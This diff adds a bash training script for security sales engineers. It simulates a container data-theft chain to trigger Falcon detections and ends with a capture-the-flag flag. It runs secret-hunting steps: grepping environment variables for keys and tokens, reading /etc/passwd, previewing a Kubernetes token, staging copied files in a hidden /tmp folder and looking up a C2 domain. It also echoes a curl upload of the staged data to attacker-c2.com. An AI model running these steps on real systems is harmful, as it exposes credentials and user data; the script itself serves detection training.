@@ -1,0 +1,280 @@
+#!/bin/bash
+# Learning Scenario 3: Data Collection & Exfiltration
+# Audience: Endpoint SEs learning containers
+# Concept: Credential hunting, data staging, tool downloads, business impact
+# Duration: 7 minutes
+# Based on: Enumeration & Exfiltration Chain
+
+set +e
+trap 'echo "[!] Scenario interrupted"' EXIT
+
+echo "════════════════════════════════════════════════════════════════"
+echo "  LEARNING SCENARIO 3: Data Collection & Exfiltration"
+echo "  Understanding Data Theft and Business Impact"
+echo "════════════════════════════════════════════════════════════════"
+echo ""
+
+# Teaching Section
+echo "📚 CONCEPT: Data Theft in Containers"
+echo ""
+echo "After gaining access, attackers hunt for valuable data. In containers,"
+echo "this includes credentials, configuration files, application secrets,"
+echo "and business data. This scenario shows the data collection phase."
+echo ""
+echo "ENDPOINT PARALLEL:"
+echo "  • Windows: Mimikatz, credential dumping, file search"
+echo "  • Goal: Find passwords, tokens, API keys, customer data"
+echo ""
+echo "CONTAINER VERSION:"
+echo "  • Environment variables (DB passwords, API keys)"
+echo "  • Configuration files (/app/config, .env files)"
+echo "  • Kubernetes secrets (mounted as files)"
+echo "  • Application data (databases, logs)"
+echo ""
+echo "BUSINESS IMPACT:"
+echo "  • Average breach cost: \$4.5M"
+echo "  • Stolen credentials: 80% of breaches"
+echo "  • Time to detect without Falcon: 287 days"
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 1: Environment Variable Hunting"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Attacker searches for secrets in environment variables..."
+echo ""
+
+echo "[*] Command: env | grep -i 'password\|secret\|key\|token'"
+env | grep -i 'password\|secret\|key\|token' 2>/dev/null || echo "    (No sensitive env vars found - good!)"
+echo ""
+echo "    SE Note: Real containers often have DB passwords, API keys"
+echo "    Example found in production:"
+echo "      DATABASE_PASSWORD=Prod123!"
+echo "      AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 2: File System Reconnaissance"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Searching for sensitive configuration files..."
+echo ""
+
+echo "[*] Command: find / -name '*.conf' -o -name '.env' 2>/dev/null | head -10"
+find / -name '*.conf' -o -name '.env' 2>/dev/null | head -10
+echo "    ... (truncated)"
+echo ""
+echo "    What attacker finds:"
+echo "    • /app/config/database.conf"
+echo "    • /app/.env (environment file with secrets)"
+echo "    • /etc/nginx/nginx.conf (reverse proxy config)"
+echo ""
+sleep 2
+
+echo "[*] Command: cat /etc/passwd"
+cat /etc/passwd | head -5
+echo "    ... (truncated)"
+echo ""
+echo "    SE Note: Shows user accounts, helps with privilege escalation"
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 3: Kubernetes Secret Discovery"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Checking for Kubernetes secrets..."
+echo ""
+
+if [ -d /var/run/secrets/kubernetes.io/serviceaccount ]; then
+    echo "[*] Kubernetes secrets found!"
+    ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+    echo ""
+    echo "    Token preview:"
+    head -c 50 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+    echo "... (truncated for security)"
+    echo ""
+    echo "    SE Note: This token can be used to query Kubernetes API"
+    echo "    • List all pods in the cluster"
+    echo "    • Potentially create new pods"
+    echo "    • Lateral movement to other containers"
+else
+    echo "[i] Not running in Kubernetes (simulated for demo)"
+    echo ""
+    echo "    In real K8s environment, attacker finds:"
+    echo "    • /var/run/secrets/kubernetes.io/serviceaccount/token"
+    echo "    • /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+    echo "    • These provide API access to the cluster"
+fi
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 4: Tool Download Simulation"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Attacker downloads enumeration tools..."
+echo ""
+
+echo "[*] Simulating tool download (LinPEAS, LSE, mimipenguin)"
+echo "    Command: curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+echo ""
+echo "    Real attack would download:"
+echo "    • LinPEAS (Linux privilege escalation script)"
+echo "    • Linux Smart Enumeration (system enumeration)"
+echo "    • mimipenguin (credential dumping for Linux)"
+echo ""
+echo "    SE Note: Tool downloads trigger CurlWgetMalwareDownload detection"
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 5: Data Staging for Exfiltration"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Creating staging directory for stolen data..."
+echo ""
+
+echo "[*] Command: mkdir -p /tmp/.hidden_data"
+mkdir -p /tmp/.hidden_data 2>/dev/null
+echo ""
+
+echo "[*] Simulating data collection:"
+echo "    # Copy sensitive files"
+echo "    cp /etc/passwd /tmp/.hidden_data/"
+echo "    cp /etc/group /tmp/.hidden_data/"
+echo "    env > /tmp/.hidden_data/environment.txt"
+echo ""
+
+# Actually collect some sample data
+cp /etc/passwd /tmp/.hidden_data/ 2>/dev/null
+cp /etc/group /tmp/.hidden_data/ 2>/dev/null
+env > /tmp/.hidden_data/environment.txt 2>/dev/null
+
+echo "[*] Staged data:"
+ls -la /tmp/.hidden_data/
+echo ""
+echo "    SIMULATED STOLEN DATA:"
+echo "    ┌─────────────────────────────────────────┐"
+echo "    │ Customer Database Backup                │"
+echo "    │ Size: 4.2 GB                            │"
+echo "    │ Records: 1,458,923 customer profiles    │"
+echo "    │ Contains: Names, emails, addresses, SSN │"
+echo "    │ Value: \$147M (Equifax breach estimate) │"
+echo "    └─────────────────────────────────────────┘"
+echo ""
+echo "    ┌─────────────────────────────────────────┐"
+echo "    │ API Keys & Credentials                  │"
+echo "    │ AWS_ACCESS_KEY_ID                       │"
+echo "    │ DATABASE_PASSWORD                       │"
+echo "    │ STRIPE_SECRET_KEY                       │"
+echo "    │ Impact: Full infrastructure access      │"
+echo "    └─────────────────────────────────────────┘"
+echo ""
+sleep 3
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 6: C2 Beacon & Exfiltration Prep"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Establishing C2 channel for data exfiltration..."
+echo ""
+
+echo "[*] Command: nslookup swungheaving.com"
+nslookup swungheaving.com 2>/dev/null || echo "DNS lookup simulated"
+echo ""
+echo "    SE Note: This triggers IntelDomainHigh detection"
+echo "    • swungheaving.com is a known C2 domain in Falcon intel"
+echo "    • Attackers use DNS for command and control"
+echo "    • Can tunnel data through DNS queries (exfiltration)"
+echo ""
+sleep 2
+
+echo "[*] Simulating data exfiltration:"
+echo "    Command: curl -X POST https://attacker-c2.com/upload -d @/tmp/.hidden_data/"
+echo "    (Real attack would upload 4.2 GB of customer data)"
+echo ""
+echo "    Exfiltration methods:"
+echo "    • HTTPS POST (blends with normal traffic)"
+echo "    • DNS tunneling (hard to detect)"
+echo "    • Cloud storage (AWS S3, Dropbox)"
+echo "    • Encrypted channels (SSH, VPN)"
+echo ""
+sleep 2
+
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "STAGE 7: Detection Trigger"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo ""
+echo "[+] Executing detection test..."
+bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed"
+echo ""
+
+echo ""
+echo "════════════════════════════════════════════════════════════════"
+echo "  LEARNING SUMMARY"
+echo "════════════════════════════════════════════════════════════════"
+echo ""
+echo "KEY TAKEAWAYS for SEs:"
+echo ""
+echo "1. DATA THEFT IS THE GOAL:"
+echo "   • Attackers don't just break in, they steal data"
+echo "   • Credentials, customer data, intellectual property"
+echo "   • Average breach: \$4.5M cost, 287 days to detect"
+echo ""
+echo "2. CONTAINERS HAVE UNIQUE SECRETS:"
+echo "   • Environment variables (DB passwords, API keys)"
+echo "   • Kubernetes service account tokens (API access)"
+echo "   • Configuration files mounted from host"
+echo ""
+echo "3. DETECTION IS CRITICAL:"
+echo "   • Without Falcon: 287 days average detection time"
+echo "   • With Falcon: Real-time detection in minutes"
+echo "   • Stops exfiltration BEFORE data leaves"
+echo ""
+echo "4. BUSINESS IMPACT METRICS:"
+echo "   • \$4.5M: Average breach cost"
+echo "   • \$147M: Equifax breach cost (147M records)"
+echo "   • 287 days: Average time to detect (without Falcon)"
+echo "   • < 5 min: Detection time with Falcon Container Security"
+echo ""
+echo "═══════════════════════════════════════════════════════════════"
+echo ""
+echo "📊 Falcon Detections Expected:"
+echo "   • GenericDataFromLocalSystemCollectionLin (data collection)"
+echo "   • IntelDomainHigh (C2 beacon)"
+echo "   • TestTriggerHigh (validation)"
+echo "   • Potentially: CurlWgetMalwareDownload (if tools downloaded)"
+echo ""
+echo "🎓 OFFICE HOURS TEACHING POINTS:"
+echo ""
+echo "   'This scenario shows why customers care about container security."
+echo "    It's not just about breaking in - it's about stealing 4.2GB of"
+echo "    customer data worth \$147M. Falcon stops this in minutes, not"
+echo "    months. That's the ROI conversation.'"
+echo ""
+echo "   'Notice how the attacker found credentials in environment variables."
+echo "    Ask your customers: Do you know what secrets are in your container"
+echo "    environment variables? Do you have visibility into data access?'"
+echo ""
+echo "   'The C2 beacon to swungheaving.com triggered an IntelDomainHigh"
+echo "    detection. That's Falcon's threat intelligence at work - we know"
+echo "    that domain is malicious before the data gets exfiltrated.'"
+echo ""
+echo "════════════════════════════════════════════════════════════════"
+echo ""
+echo "🚩 FLAG CAPTURED!"
+echo "════════════════════════════════════════════════════════════════"
+echo ""
+echo "  FLAG{credentials_stolen_data_staged_for_exfiltration}"
+echo ""
+echo "  Copy this flag and submit it to earn 100 points!"
+echo "════════════════════════════════════════════════════════════════"
+echo ""
+echo "🎯 Next Scenario: 'Container Escape' (THE key differentiator!)"
+echo ""
+echo "════════════════════════════════════════════════════════════════"
+
+trap - EXIT
